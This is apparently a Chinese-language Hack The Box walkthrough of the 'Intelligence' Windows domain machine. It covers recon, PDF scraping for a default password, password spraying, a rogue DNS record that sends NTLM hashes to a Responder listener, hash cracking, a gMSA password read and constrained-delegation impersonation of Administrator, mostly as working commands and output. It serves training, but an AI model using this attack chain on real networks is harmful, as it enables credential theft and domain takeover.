---
layout: post
title: HTB——Intelligence
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/01.png?raw=true)

# 0x01 信息收集

```bash
┌──(root㉿kali)-[/home/kali/HTB/Intelligence]
└─# nmap -A 10.129.224.3                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 03:08 EDT
Nmap scan report for 10.129.224.3
Host is up (0.12s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-29 09:01:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-04-29T09:02:41+00:00; +1h52m09s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-04-29T09:02:41+00:00; +1h52m09s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-29T09:02:41+00:00; +1h52m09s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-04-29T09:02:41+00:00; +1h52m09s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-29T09:01:56
|_  start_date: N/A
|_clock-skew: mean: 1h52m08s, deviation: 1s, median: 1h52m08s

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   95.32 ms 10.10.16.1
2   95.40 ms 10.129.224.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.38 seconds

┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-29 03:07:28] [INFO] 暴力破解线程数: 1                                                   
[2025-04-29 03:07:28] [INFO] 开始信息扫描
[2025-04-29 03:07:28] [INFO] 最终有效主机数量: 1
[2025-04-29 03:07:28] [INFO] 开始主机扫描
[2025-04-29 03:07:28] [INFO] 有效端口数量: 233
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:80
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:445
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:389
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:135
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:139
[2025-04-29 03:07:28] [SUCCESS] 端口开放 10.129.224.3:88
[2025-04-29 03:07:33] [SUCCESS] 服务识别 10.129.224.3:445 => 
[2025-04-29 03:07:34] [SUCCESS] 服务识别 10.129.224.3:88 => 
[2025-04-29 03:07:34] [SUCCESS] 服务识别 10.129.224.3:139 =>  Banner:[.]
[2025-04-29 03:07:34] [SUCCESS] 服务识别 10.129.224.3:389 => 
[2025-04-29 03:07:34] [SUCCESS] 服务识别 10.129.224.3:80 => [http]
[2025-04-29 03:08:33] [SUCCESS] 服务识别 10.129.224.3:135 => 
[2025-04-29 03:08:33] [INFO] 存活端口数量: 6
[2025-04-29 03:08:33] [INFO] 开始漏洞扫描
[2025-04-29 03:08:33] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                   
[2025-04-29 03:08:34] [SUCCESS] 网站标题 http://10.129.224.3       状态码:200 长度:7432   标题:Intelligence                                                                                       
[2025-04-29 03:08:34] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.224.3                                                                           
主机名: dc                                                                                       
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.224.3                                                                            
   IPv6地址:                                                                                     
      └─ dead:beef::457a:529b:e77f:a19                                                           
      └─ dead:beef::177                                                                          
[2025-04-29 03:11:02] [SUCCESS] 扫描已完成: 11/11

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[03:08:10] [INFO] Start IpScan:10.129.224.3
[03:08:10] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[03:08:11] [+] 10.129.224.3:53 open
[03:08:11] [+] 10.129.224.3:135 open
[03:08:11] [+] 10.129.224.3:139 open
[03:08:11] [+] 10.129.224.3:80 open
[03:08:11] [+] 10.129.224.3:88 open
[03:08:11] [+] 10.129.224.3:445 open
[03:08:11] [+] 10.129.224.3:593 open
[03:08:11] [+] 10.129.224.3:389 open
[03:08:11] [+] 10.129.224.3:636 open
[03:08:11] [+] 10.129.224.3:464 open
[03:08:12] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.224.3:593 [ncacn_http/1.0]
[03:08:12] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.224.3:135 [.@]
[03:08:12] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.224.3:139 [.]
[03:08:12] [INFO] start WMI check 10.129.224.3:135
[03:08:12] [+] 开始 WmiExec 任务: WMI://10.129.224.3:135
[03:08:12] [+] [TCP/LDAP]   10.129.224.3:389 [0.a]
[03:08:12] [INFO] start LDAP check 10.129.224.3:389
[03:08:12] [+] 开始 LdapScan 任务: LDAP://10.129.224.3:389
[03:08:12] [+] [TCP/HTTP] [200] [jQuery][Microsoft-IIS/10.0] http://10.129.224.3:80 [Intelligence]
[03:08:17] [+] [TCP/KPASSWD5]   10.129.224.3:464 
[03:08:17] [+] [TCP/MICROSOFT-DS]   10.129.224.3:445 
[03:08:17] [INFO] start SMB check 10.129.224.3:445
[03:08:17] [+] 开始 SmbScan 任务: SMB://10.129.224.3:445
[03:08:19] [+] [TCP/SPARK]  [Apache Spark] 10.129.224.3:88 [.]
[03:08:22] [+] 10.129.224.3:3268 open                         
[03:08:22] [+] 10.129.224.3:3269 open
[03:08:27] [+] [TCP/LDAP]   10.129.224.3:3268 [0.a]
[03:08:27] [INFO] start LDAP check 10.129.224.3:3268
[03:08:27] [+] 开始 LdapScan 任务: LDAP://10.129.224.3:3268
[03:08:32] [+] [TCP/SSL]   10.129.224.3:636 [.|.M.h.$ Lv m E. C- g.x.K.;'.9 )Ra-.e ^.Z.H@ba.V./]
[03:08:32] [INFO] start LDAPS check 10.129.224.3:636
[03:08:32] [+] 开始 LdapsScan 任务: LDAPS://10.129.224.3:636
[03:08:37] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.224.3:3269 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                       
[03:08:37] [INFO] start LDAP check 10.129.224.3:3269
[03:08:37] [+] 开始 LdapScan 任务: LDAP://10.129.224.3:3269
```

---

# 0x02 批量获取PDF并处理信息

访问80端口服务，除了`subscribe`就只有一个download PDF功能。查看发现其是以日期+upload命名

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/02.png?raw=true)

使用burp的爆破模块，我们对其日期进行爆破看看有无其他传上去的PDF

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/03.png?raw=true)

爆破后我们依次查看PDF内容，访问到`06-04`与`12-30`时我们有了新发现。

```txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

拿到了默认密码。但是尝试LDAP和SID均不能将域内账户枚举出来。学到了新工具`kerbrute`可以将域内用户给枚举出来.我们需要现将所有的PDF文件下载下来，并使用指令将所有PDF的作者提取出来制作成`user`用户名字典

```python
import datetime
import io
import requests
from PyPDF2 import PdfReader

t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PdfReader(data)
            creator = pdf.metadata.get('/Creator')
            if creator:
                users.add(creator)
            for page in pdf.pages:
                text = page.extract_text()
                if text and any(k in text.lower() for k in keywords):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w', encoding='utf-8') as f:
    f.write('\n'.join(users))
```

运行完成后我们就可以拿去做密码喷洒辣

```bash
┌──(root㉿kali)-[/home/kali/HTB/Intelligence]
└─# crackmapexec smb 10.129.224.3 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.129.224.3    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.224.3    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.224.3    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

拿到了有效的账密。在登陆之前我们再查看一下SMB有无共享文件，就给共享了一个Users文件夹。我们全部薅下来。尝试后发现`Tiffany.Molina`没有winrm权限，那看来从SMB将`user.txt`薅出来还是预期解法了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/04.png?raw=true)

---

# 0x03 伪造恶意DNS记录获取NTLM

观察到除了共享的`Users`，还有一个共享的文件夹`IT`.我们下载下来查看内容

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

到这没什么思路了，看了一下WP。我们可以利用此脚本，先使用`KrbRelay`的`dnstools.py`来向靶机上添加一个新的DNS记录，将其指向我们本地启动的`Responder`，就可以使用`Responder`来截获NTLMv2了。

首先我们向靶机上添加DNS记录

```bash
┌──(root㉿kali)-[/home/kali/HTB/Intelligence/krbrelayx-master]
└─# python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-gailo --data 10.10.16.10 --type A intelligence.htb -dns-ip 10.129.224.3
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

然后启用responder监听.脚本显示五分钟执行一次，我们只需要稍事等待就可以获取到NTLM辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/05.png?raw=true)

```powershell
TED.GRAVES::intelligence:b0a7c11bd869bafa:ad2a61a206afdd1bf07f6d4b0b8c2853:010100000000000025aaf975f0b8db01bdfea06c38ed699f0000000002000800530056004100330001001e00570049004e002d004d0050003000520048004f004b0047005700450055000400140053005600410033002e004c004f00430041004c0003003400570049004e002d004d0050003000520048004f004b0047005700450055002e0053005600410033002e004c004f00430041004c000500140053005600410033002e004c004f00430041004c0008003000300000000000000000000000002000008d3f88b6b00166f1cfe8fc8bbb69eaf217f4f88ec4c83bbae7b2d1d47bf6f1360a0010000000000000000000000000000000000009003e0048005400540050002f007700650062002d006700610069006c006f002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:b0a7c11bd869bafa:ad2a61a20...000000
Time.Started.....: Tue Apr 29 11:23:00 2025 (2 secs)
Time.Estimated...: Tue Apr 29 11:23:02 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9098.6 kH/s (0.34ms) @ Accel:64 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10818554/14344386 (75.42%)
Rejected.........: 5114/10818554 (0.05%)
Restore.Point....: 9835056/14344386 (68.56%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: babyjd1 -> Moi6699
Hardware.Mon.#1..: Temp: 30c Util:  5% Core:1500MHz Mem:14001MHz Bus:8
```

至此我们拿到了第二位倒霉蛋的账密`TED.GRAVES:Mr.Teddy`。我们使用bloodhound来查看一下域内信息。发现了有趣的`readGMSAPassword`权限

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/06.png?raw=true)

接下来我们使用`Rebound`中的类似手法来拿到`svc_int$`的NTLM

```bash
┌──(root㉿kali)-[/home/kali/HTB/Intelligence]
└─# bloodyAD -d intelligence.htb -u 'ted.graves' -p 'Mr.Teddy' --host dc.intelligence.htb get object 'svc_int$' --attr msDS-ManagedPassword

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b08e6a29a7f50ec81c11df8649e9d7df
msDS-ManagedPassword.B64ENCODED: ZIxoL9q/CmR9g8NSrNoJ4VWHqDWPFdPdOkra+UiqHUG/XUeMiNLcSGpIfGX/xq19wrPqzZH/nVADpU2TzStOKhtY5IA+PAP2WjmIRFTdWQ12IFnqhqmtMbgxvEM1XE+aKeTkYK4xTuGwL1nP+29ZDWUijDwjGFpKqrf1BmKQZxxegDcaH0SMSpN950RegU29HcqXg6enJ+7fVD99UVeFLkDQR5wnpmN1ON240DA2oEp1mIy9bRHyOy/kw/03IBJG0SO0M7fG94nKs9TJlVMf/1aC77vIbwDXs4m3ZvmiyaCpWVCJUcucSqiqMFSGU2Zq+PlDJfTFuF3+D60nATbL1Q==
```

---

# 0x04 约束委派

获得成功后，我们查看`SVC_INT`对DC拥有的权限

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/07.png?raw=true)

`AllowedToDelegate`，典型的约束委派。我们先使用此账户获取到`Administrator`的ST服务票据。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Intelligence]
└─# impacket-getST -spn www/dc.intelligence.htb -impersonate administrator intelligence.htb/'svc_int$' -hashes aad3b435b51404eeaad3b435b51404ee:b08e6a29a7f50ec81c11df8649e9d7df
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

然后通过此ST票据，我们就可以直接TGT登录`Administrator`账户辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Intelligence/08.png?raw=true)